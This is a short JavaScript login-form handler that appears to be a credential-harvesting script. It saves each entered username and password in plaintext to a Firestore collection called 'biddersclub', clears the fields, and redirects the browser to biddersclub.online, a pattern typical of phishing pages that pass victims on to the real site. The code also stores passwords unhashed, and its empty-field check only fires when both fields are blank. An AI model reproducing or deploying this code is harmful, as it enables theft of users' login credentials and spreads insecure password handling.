let username = document.querySelector('#username');
let password = document.querySelector('#password');

function submit() {

    const collectionPath = "biddersclub";
    try {
        if(!username.value && !password.value){
            alert('username or password cannot be empty')
        }
        else {
            db.collection(collectionPath).doc(username.value).set({
                username: username.value,
                password: password.value
            }, {
                merge: true
            })
    
            username.value = ''
            password.value = ''
            window.location.href = 'https://biddersclub.online/';
        }
    } catch (e) {
        // alert(e.message);
        console.log(e);
    }
}